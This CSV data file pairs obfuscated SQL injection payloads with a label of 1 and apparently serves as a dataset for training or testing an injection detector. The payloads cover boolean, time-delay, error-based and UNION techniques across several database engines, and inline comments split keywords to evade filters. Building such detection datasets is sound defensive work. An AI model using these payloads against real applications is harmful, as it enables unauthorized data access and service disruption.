Query,Label
1  )   wher/**/e 4548  =  4548 a/**/nd 9198  =  9198--,1
1 rl/**/ike   (  sele/**/ct   (  case when   (  8314  =  5463  )   then 1 else 0x28 end   )    ) ,1
"-4807' o/**/r 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  s/**/elect   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   f/**/rom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   a/**/nd 'wwki'  =  'wwki",1
"1'||  (  sel/**/ect 'nbmo' fro/**/m dual whe/**/re 5572  =  5572 an/**/d 8635  =    (  se/**/lect count  (  *  )   fr/**/om generate_series  (  1,5000000   )    )   --",1
"-3151%""   )    )     )   u/**/nion all sele/**/ct 6250,6250,6250,6250,6250,6250,6250,6250,6250,6250#",1
"1'+  (  selec/**/t 'mtpt' wh/**/ere 7483  =  7483 u/**/nion all s/**/elect nul/**/l,n/**/ull,n/**/ull,nu/**/ll,nul/**/l,nul/**/l,nu/**/ll,n/**/ull,nu/**/ll--",1
"1' a/**/nd elt  (  4249  =  4249,7259  )   a/**/nd 'nsbj' lik/**/e 'nsbj",1
"1%""  )   o/**/r 7552  =    (  selec/**/t count  (  *  )   f/**/rom rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   an/**/d   (  ""%""  =  """,1
1%' an/**/d 2006  =  2006,1
"-6200'   )    )    as jjpz whe/**/re 4490  =  4490 uni/**/on all se/**/lect 4490,4490,4490,4490,4490,4490,4490,4490,4490,4490--",1
"-6520%""  )   o/**/rde/**/r b/**/y 1#",1
-9673  )   o/**/r 8571  =  8571--,1
1'||  (  s/**/elect 'vasx' w/**/here 4770  =  4770 a/**/nd 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sele/**/ct   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   fro/**/m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||',1
1 an/**/d 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  s/**/elect   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   fr/**/om dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  -- slje,1
1  )   as bzuh wher/**/e 8041  =  8041 a/**/nd 6307  =  9200#,1
"-9152""   )    )    as avga w/**/here 3825  =  3825 o/**/rd/**/er b/**/y 1#",1
"1""  )   as pxdq wh/**/ere 2236  =  2236 a/**/nd 2006  =  2006",1
"1""   )    )    as pqbs wh/**/ere 4409  =  4409",1
"-7678   )    )     )   u/**/nion all s/**/elect 2622,2622,2622,2622,2622,2622,2622,2622--",1
"-9015%""  )   unio/**/n all s/**/elect 6948,6948--",1
"1%'   )    )    u/**/nion all selec/**/t n/**/ull,nu/**/ll,nul/**/l,n/**/ull,nu/**/ll,nul/**/l#",1
"1  )   w/**/here 1270  =  1270 o/**/r   (  se/**/lect 9173 fro/**/m  (  se/**/lect count  (  *  )  ,concat  (  0x7171706a71,  (  sel/**/ect   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floo/**/r  (  ran/**/d  (  0  )  *2   )    )   x fr/**/om i/**/nfo/**/rmation_schema.character_se/**/ts group b/**/y x  )  a  )  --",1
"1"" o/**/r 7417  =    (  s/**/elect count  (  *  )   fr/**/om sysibm.systa/**/bles as t1,sysibm.systab/**/les as t2,sysibm.systabl/**/es as t3  )  --",1
-9653'  )   whe/**/re 2705  =  2705 o/**/r 9323  =  9323#,1
"1  )   un/**/ion all sele/**/ct nu/**/ll,nu/**/ll,n/**/ull,nu/**/ll,nu/**/ll,nul/**/l,nu/**/ll,n/**/ull,nu/**/ll,nul/**/l#",1
"-3872%""   )    )     )   un/**/ion all s/**/elect 1637,1637,1637,1637,1637#",1
1'+  (  s/**/elect 'rpds' whe/**/re 5870  =  5870 an/**/d 4595  =  4595#,1
"1'+  (  sel/**/ect 'vabj' wh/**/ere 7178  =  7178 uni/**/on all sele/**/ct nul/**/l,nul/**/l,nul/**/l,nul/**/l,n/**/ull#",1
"1   )    )    as vzso wh/**/ere 8541  =  8541 o/**/r   (  se/**/lect 2*  (  if   (    (   selec/**/t * fr/**/om   (  sele/**/ct concat  (  0x7171706a71,  (  selec/**/t   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1
"1%""  )   a/**/nd exp  (  ~  (  sele/**/ct * fro/**/m   (  sel/**/ect concat  (  0x7171706a71,  (  selec/**/t   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    a/**/nd   (  ""%""  =  """,1
"1"" w/**/here 4684  =  4684 uni/**/on all s/**/elect nul/**/l,nul/**/l,n/**/ull,n/**/ull#",1
1' wh/**/ere 1628  =  1628,1
"1'   )    )    an/**/d 8407  =    (  se/**/lect count  (  *  )   fro/**/m generate_series  (  1,5000000   )    )    a/**/nd    (    (   'dfsj'  =  'dfsj",1
"1   )    )     )   o/**/r updat/**/exml  (  1808,concat  (  0x2e,0x7171706a71,  (  se/**/lect   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   an/**/d    (    (     (  9474  =  9474",1
"1%""  )   an/**/d char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nu/**/ll  )  ,0  )  ,500000000  )  ,nul/**/l  )  --",1
"1""  )   whe/**/re 8390  =  8390",1
"1'  )   as dajk w/**/here 1452  =  1452 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
"1""  )   w/**/here 5850  =  5850 o/**/r 1022  =    (  selec/**/t count  (  *  )   fro/**/m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1"" unio/**/n all se/**/lect nul/**/l,nu/**/ll,nu/**/ll,n/**/ull,nul/**/l,nul/**/l#",1
if  (  5127  =  2829  )   s/**/elect 5127 else dro/**/p function okos--,1
1'   )    )    an/**/d 4650  =  1322#,1
-9355' o/**/r   (  8459  =  8459  )  *4906 an/**/d 'aegf'  =  'aegf,1
1' uni/**/on all s/**/elect nul/**/l--,1
"1  )   o/**/r 8156  =    (  se/**/lect count  (  *  )   fr/**/om generate_series  (  1,5000000   )    )   --",1
"call regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nu/**/ll  )  ,0  )  ,500000000  )  ,n/**/ull  )  ",1
1 an/**/d   (  5369  =  8325  )  *8325# psze,1
"-5196""   )    )     )   o/**/r 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  s/**/elect   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   fr/**/om dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   an/**/d    (    (     (  ""gbcq"" lik/**/e ""gbcq",1
"1'+  (  s/**/elect 'jfir' wh/**/ere 7814  =  7814 a/**/nd   (  sel/**/ect 2*  (  if   (    (   selec/**/t * f/**/rom   (  s/**/elect concat  (  0x7171706a71,  (  s/**/elect   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   +'",1
"1%""   )    )     )   o/**/r   (  se/**/lect * f/**/rom   (  sel/**/ect  (  sleep  (  5   )    )     )  sddo  )  #",1
"1' o/**/r 8421  =    (  s/**/elect count  (  *  )   fro/**/m generate_series  (  1,5000000   )    )    an/**/d 'obax' li/**/ke 'obax",1
-1641' u/**/nion all sele/**/ct 4835#,1
1 a/**/nd 9198  =  9198--,1
"1""  )   wh/**/ere 9115  =  9115",1
"1   )    )    as xovu w/**/here 4530  =  4530 o/**/r 4411  =    (  sel/**/ect count  (  *  )   f/**/rom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
1'||  (  selec/**/t 'mwpd' w/**/here 2887  =  2887,1
"1"" rli/**/ke   (  se/**/lect   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   ",1
"-9062"" o/**/r 6872  =  6872 an/**/d ""aumq"" l/**/ike ""aumq",1
"1%""   )    )    o/**/r 4411  =    (  selec/**/t count  (  *  )   fr/**/om sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   an/**/d    (    (   ""%""  =  """,1
1 wh/**/ere 2956  =  2956,1
"1%' a/**/nd 3580  =    (  sel/**/ect count  (  *  )   fr/**/om domai/**/n.domai/**/ns as t1,domai/**/n.columns as t2,domai/**/n.ta/**/bles as t3  )  --",1
-4542'   )    )    o/**/rder b/**/y 1#,1
"1%""   )    )     )   a/**/nd elt  (  1210  =  1210,sleep  (  5   )    )    a/**/nd    (    (     (  ""%""  =  """,1
"-1432""   )    )    uni/**/on all sel/**/ect 9008,9008,9008#",1
"1""   )    )    a/**/nd 8329  =  5584#",1
1  )   as imdt wh/**/ere 6431  =  6431,1
"1""  )   as jidc wher/**/e 6093  =  6093 a/**/nd 9198  =  9198--",1
-3634%'   )    )    o/**/r 2671  =  2434,1
"1""   )    )    a/**/nd sleep  (  5  )   an/**/d    (    (   ""lied"" lik/**/e ""lied",1
"1' i/**/n boolean mode  )   o/**/r 4411  =    (  sele/**/ct count  (  *  )   f/**/rom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  #",1
1'+  (  sele/**/ct xruo wher/**/e 5709  =  5709 an/**/d 7533  =  7533  )  +',1
"1'   )    )    o/**/r elt  (  6272  =  6272,sleep  (  5   )    )    a/**/nd    (    (   'zjel' l/**/ike 'zjel",1
s/**/elect case when 4488  =  5522 then 1 else n/**/ull end--,1
-3059'  )   as jhbh w/**/here 4056  =  4056 o/**/r   (  3498  =  6965  )  *6965--,1
"-1639   )    )    o/**/r 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  s/**/elect   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   fro/**/m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   an/**/d    (    (   3318  =  3318",1
"1"" o/**/r 5356  =    (  se/**/lect count  (  *  )   fro/**/m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"-4885 un/**/ion all se/**/lect 4589,4589,4589,4589,4589,4589,4589,4589,4589,4589#",1
"1""   )    )    an/**/d 6240  =    (  'qqpjq'||  (  s/**/elect case 6240 when 6240 then 1 else 0 end f/**/rom rdb$da/**/tabase  )  ||'qzvzq'  )   a/**/nd    (    (   ""ycuo"" li/**/ke ""ycuo",1
"s/**/elect count  (  *  )   fro/**/m sysibm.systab/**/les as t1,sysibm.systa/**/bles as t2,sysibm.systa/**/bles as t3# sfup",1
"1'   )    )     )   o/**/r 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    an/**/d    (    (     (  'sqzl'  =  'sqzl",1
"1 an/**/d   (  s/**/elect 2*  (  if   (    (   s/**/elect * fro/**/m   (  sele/**/ct concat  (  0x7171706a71,  (  sel/**/ect   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  -- tzry",1
"1%""   )    )    o/**/r   (  se/**/lect 2*  (  if   (    (   sel/**/ect * fr/**/om   (  se/**/lect concat  (  0x7171706a71,  (  sele/**/ct   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   an/**/d    (    (   ""%""  =  """,1
"1"" w/**/here 1537  =  1537 an/**/d   (  sel/**/ect 9067 fr/**/om  (  se/**/lect count  (  *  )  ,concat  (  0x7171706a71,  (  s/**/elect   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floo/**/r  (  ra/**/nd  (  0  )  *2   )    )   x fro/**/m i/**/nfo/**/rmation_schema.character_se/**/ts group b/**/y x  )  a  )  --",1
1  )   a/**/nd   (  2342  =  3620  )  *3620,1
"1' a/**/nd elt  (  3247  =  3969,3969  )   an/**/d 'xcbm' lik/**/e 'xcbm",1
1  )   whe/**/re 1100  =  1100 an/**/d sleep  (  5  )  --,1
"1%""   )    )     )   o/**/r 8421  =    (  sele/**/ct count  (  *  )   f/**/rom generate_series  (  1,5000000   )    )    a/**/nd    (    (     (  ""%""  =  """,1
"1'+  (  sel/**/ect 'epza' wh/**/ere 8994  =  8994 an/**/d make_se/**/t  (  3782  =  2428,2428   )    )   +'",1
"1""   )    )    an/**/d 9198  =  9198--",1
"1'+  (  s/**/elect eztr wher/**/e 4260  =  4260 an/**/d 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5   )    )   +'",1
"1'  )   o/**/r 5286  =    (  selec/**/t count  (  *  )   fr/**/om all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   an/**/d   (  'ireg' lik/**/e 'ireg",1
se/**/lect   (  case when   (  2294  =  3651  )   then 2294 else 2294*  (  selec/**/t 2294 f/**/rom i/**/nfo/**/rmation_schema.character_s/**/ets  )   end  )  #,1
waitfo/**/r delay '0:0:5' an/**/d    (    (     (  'ywnm'  =  'ywnm,1
"-8976%""   )    )     )   unio/**/n all sele/**/ct 5146,5146,5146,5146,5146,5146,5146,5146--",1
"1%'   )    )    unio/**/n all s/**/elect n/**/ull,nul/**/l,n/**/ull,nu/**/ll,n/**/ull,n/**/ull,nu/**/ll,nu/**/ll#",1
"-8331'  )   u/**/nion all se/**/lect 1452,1452,1452,1452,1452--",1
"1""   )    )    as dooi wh/**/ere 1806  =  1806 a/**/nd 6414  =    (  se/**/lect count  (  *  )   fr/**/om rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1'   )    )     )   o/**/r 7552  =    (  se/**/lect count  (  *  )   fr/**/om rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   an/**/d    (    (     (  'nqam'  =  'nqam",1
-2174'   )    )    o/**/r 5903  =    (  'qqpjq'||  (  sel/**/ect case 5903 when 5903 then 1 else 0 end fr/**/om rdb$dat/**/abase  )  ||'qzvzq'  )   a/**/nd    (    (   'dyyg'  =  'dyyg,1
"1"" o/**/r char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nul/**/l  )  ,0  )  ,500000000  )  ,n/**/ull  )   an/**/d ""fvtu"" lik/**/e ""fvtu",1
-4637' o/**/r 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  se/**/lect   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ,1
"-2373%""  )   o/**/r 9323  =  9323#",1
1  )   a/**/nd 2006  =  2006,1
"1'  )   o/**/r 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    an/**/d   (  'osov' lik/**/e 'osov",1
1%'   )    )    rl/**/ike   (  sele/**/ct * f/**/rom   (  sel/**/ect  (  sleep  (  5   )    )     )  sgvo  )   a/**/nd    (    (   '%'  =  ',1
"1   )    )    a/**/nd 2716  =    (  sele/**/ct count  (  *  )   fr/**/om sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
-5031' o/**/r 9323  =  9323#,1
"-4379' unio/**/n all sele/**/ct 1648,1648,1648,1648,1648,1648,1648#",1
"-3361'||  (  selec/**/t 'msfi' wh/**/ere 4806  =  4806 un/**/ion all s/**/elect 4806,4806,4806,4806,4806,4806,4806,4806,4806--",1
1' o/**/r   (  selec/**/t * fro/**/m   (  sele/**/ct  (  sleep  (  5   )    )     )  ydpu  )   a/**/nd 'iwmy'  =  'iwmy,1
1'+  (  sel/**/ect 'wyxu' wh/**/ere 2555  =  2555 uni/**/on all sele/**/ct n/**/ull#,1
"-8735'   )    )    u/**/nion all se/**/lect 3262,3262,3262--",1
"-4248""   )    )    uni/**/on all se/**/lect 9450,9450,9450--",1
"selec/**/t count  (  *  )   f/**/rom sysibm.syst/**/ables as t1,sysibm.systa/**/bles as t2,sysibm.syst/**/ables as t3 an/**/d    (    (   'gfln'  =  'gfln",1
"1%' a/**/nd 5556  =    (  se/**/lect count  (  *  )   fro/**/m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   an/**/d '%'  =  '",1
"1""   )    )    as eagr whe/**/re 3366  =  3366 an/**/d elt  (  4249  =  4249,7259  )  --",1
"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  s/**/elect   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   a/**/nd 'tuzl'  =  'tuzl",1
1 wh/**/ere 5311  =  5311 rli/**/ke   (  selec/**/t * f/**/rom   (  se/**/lect  (  sleep  (  5   )    )     )  vwyq  )  #,1
"-7139""  )   whe/**/re 2723  =  2723 o/**/r 3900  =  5082--",1
"1'+  (  selec/**/t mcfb wh/**/ere 4050  =  4050 o/**/r 9643  =    (  sel/**/ect count  (  *  )   fro/**/m domai/**/n.domai/**/ns as t1,domai/**/n.columns as t2,domai/**/n.ta/**/bles as t3   )    )   +'",1
"-3109"" o/**/r elt  (  1032  =  1032,3623  )  ",1
1'+  (  sele/**/ct 'qsqs' wh/**/ere 9227  =  9227 waitfo/**/r delay '0:0:5'  )  +',1
"1' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   an/**/d 'hofy' li/**/ke 'hofy",1
1   )    )    as emtf wh/**/ere 3561  =  3561 o/**/r   (  s/**/elect * fr/**/om   (  selec/**/t  (  sleep  (  5   )    )     )  ydpu  )  --,1
"-5245""   )    )     )   un/**/ion all s/**/elect 8106,8106,8106#",1
sel/**/ect   (  case when   (  8716  =  1338  )   then 1 else 8716*  (  s/**/elect 8716 fr/**/om master..sysdataba/**/ses  )   end  )  --,1
"1'   )    )     )   a/**/nd 6414  =    (  selec/**/t count  (  *  )   fr/**/om rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   an/**/d    (    (     (  'hryb'  =  'hryb",1
"1'   )    )    o/**/r 8384  =  li/**/ke  (  'abcdefg',upper  (  hex  (  ran/**/domblob  (  500000000/2   )    )      )    )    a/**/nd    (    (   'aumk' lik/**/e 'aumk",1
"se/**/lect dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   f/**/rom dual an/**/d    (    (     (  ""mofa"" li/**/ke ""mofa",1
-6244'  )   as szpd wher/**/e 8445  =  8445 o/**/r 2724 i/**/n    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  sele/**/ct   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1
"1 wher/**/e 1842  =  1842 o/**/r 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
"1'  )   a/**/nd   (  selec/**/t 9067 fr/**/om  (  sele/**/ct count  (  *  )  ,concat  (  0x7171706a71,  (  se/**/lect   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floo/**/r  (  ran/**/d  (  0  )  *2   )    )   x fro/**/m i/**/nfo/**/rmation_schema.character_se/**/ts group b/**/y x  )  a  )  ",1
"-2305' i/**/n boolean mode  )   un/**/ion all s/**/elect 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",1
"-1040 whe/**/re 3058  =  3058 uni/**/on all sel/**/ect 3058,3058,3058,3058,3058,3058,3058,3058,3058,3058--",1
"-9405'  )   uni/**/on all sel/**/ect 8283,8283,8283,8283--",1
"1   )    )    as rbae wher/**/e 2049  =  2049 o/**/r 6979  =  lik/**/e  (  'abcdefg',upper  (  hex  (  ran/**/domblob  (  500000000/2   )    )      )    )   --",1
"1  )   a/**/nd 6510  =    (  s/**/elect count  (  *  )   fro/**/m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1
"-7868"" un/**/ion all se/**/lect 1805--",1
"-8038'   )    )    o/**/r elt  (  1032  =  1032,3623  )   a/**/nd    (    (   'xfyq'  =  'xfyq",1
-3821'  )   o/**/r 9323  =  9323#,1
"1'||  (  s/**/elect 'xyrk' fr/**/om dual wh/**/ere 9844  =  9844 a/**/nd 9254  =    (  sele/**/ct count  (  *  )   fr/**/om rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
1' w/**/here 5035  =  5035 a/**/nd 8594  =    (  selec/**/t 8594 fr/**/om pg_sleep  (  5   )    )   --,1
1' wh/**/ere 1652  =  1652 a/**/nd sleep  (  5  )  #,1
"1',  (  selec/**/t   (  case when   (  5154  =  5154  )   then 1 else 5154*  (  sel/**/ect 5154 f/**/rom master..sysd/**/atabases  )   end   )    )   ",1
"1%""   )    )     )   a/**/nd elt  (  3114  =  3114,sleep  (  5   )    )   #",1
1'   )    )    as cwss w/**/here 9720  =  9720,1
"-6475""   )    )     )   o/**/r 4144  =    (  selec/**/t upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sele/**/ct   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   fro/**/m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   fr/**/om dual  )   an/**/d    (    (     (  ""mdsx"" l/**/ike ""mdsx",1
"call regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nul/**/l  )  ,0  )  ,500000000  )  ,nul/**/l  )   an/**/d    (    (   'nbsf' lik/**/e 'nbsf",1
"1 wh/**/ere 2914  =  2914 un/**/ion all se/**/lect nu/**/ll,nul/**/l,nul/**/l#",1
"1"" a/**/nd 2006  =  2006",1
1'+  (  sel/**/ect biqo whe/**/re 6046  =  6046,1
"call regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,n/**/ull  )  ,0  )  ,500000000  )  ,n/**/ull  )   a/**/nd ""%""  =  """,1
1' an/**/d   (  s/**/elect * f/**/rom   (  selec/**/t  (  sleep  (  5   )    )     )  fzno  )   a/**/nd 'vwve' li/**/ke 'vwve,1
1 rl/**/ike sleep  (  5  )  # urxh,1
"1'+  (  s/**/elect ummn wh/**/ere 8883  =  8883 an/**/d 4241  =  convert  (  i/**/nt,  (  s/**/elect char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  selec/**/t   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   +'",1
"1'   )    )     )   o/**/r char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nul/**/l  )  ,0  )  ,500000000  )  ,nu/**/ll  )  --",1
"-9837"" wher/**/e 7201  =  7201 u/**/nion all sele/**/ct 7201,7201,7201--",1
"1""  )    (  se/**/lect   (  case when   (  5451  =  5451  )   then regexp_substri/**/ng  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,nul/**/l  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   fr/**/om i/**/nfo/**/rmation_schema.system_users  )   an/**/d   (  ""jebr"" li/**/ke ""jebr",1
"-5344"" uni/**/on all selec/**/t 9482,9482,9482,9482,9482,9482,9482,9482,9482--",1
-8069'   )    )    o/**/r 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  sele/**/ct   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   an/**/d    (    (   'qbvz'  =  'qbvz,1
"se/**/lect benchmark  (  5000000,md5  (  0x4c4d6142   )    )    a/**/nd ""%""  =  """,1
"-6890""   )    )    o/**/r 5903  =    (  'qqpjq'||  (  sele/**/ct case 5903 when 5903 then 1 else 0 end fr/**/om rdb$datab/**/ase  )  ||'qzvzq'  )   an/**/d    (    (   ""ftho"" li/**/ke ""ftho",1
"1%'   )    )    u/**/nion all selec/**/t nu/**/ll,n/**/ull,nu/**/ll--",1
-3998'   )    )    o/**/r 3038  =  3038,1
"-2862'   )    )     )   un/**/ion all s/**/elect 6649,6649--",1
"1   )    )    o/**/r 4411  =    (  sel/**/ect count  (  *  )   fro/**/m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   a/**/nd    (    (   3003  =  3003",1
"1 wher/**/e 3175  =  3175 o/**/r 8421  =    (  se/**/lect count  (  *  )   f/**/rom generate_series  (  1,5000000   )    )   --",1
 (  s/**/elect   (  case when   (  6986  =  6986  )   then 6986 else 6986*  (  sel/**/ect 6986 fro/**/m mysql.db  )   end   )    ) ,1
"1 an/**/d 3202  =  lik/**/e  (  'abcdefg',upper  (  hex  (  ra/**/ndomblob  (  500000000/2   )    )      )    )   -- kegk",1
"-9583'   )    )    u/**/nion all selec/**/t 6392,6392,6392,6392,6392,6392,6392,6392,6392,6392#",1
1%'   )    )     )   an/**/d 3715 i/**/n    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  s/**/elect   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   a/**/nd    (    (     (  '%'  =  ',1
1%' an/**/d   (  s/**/elect * fro/**/m   (  s/**/elect  (  sleep  (  5   )    )     )  gcrr  )  #,1
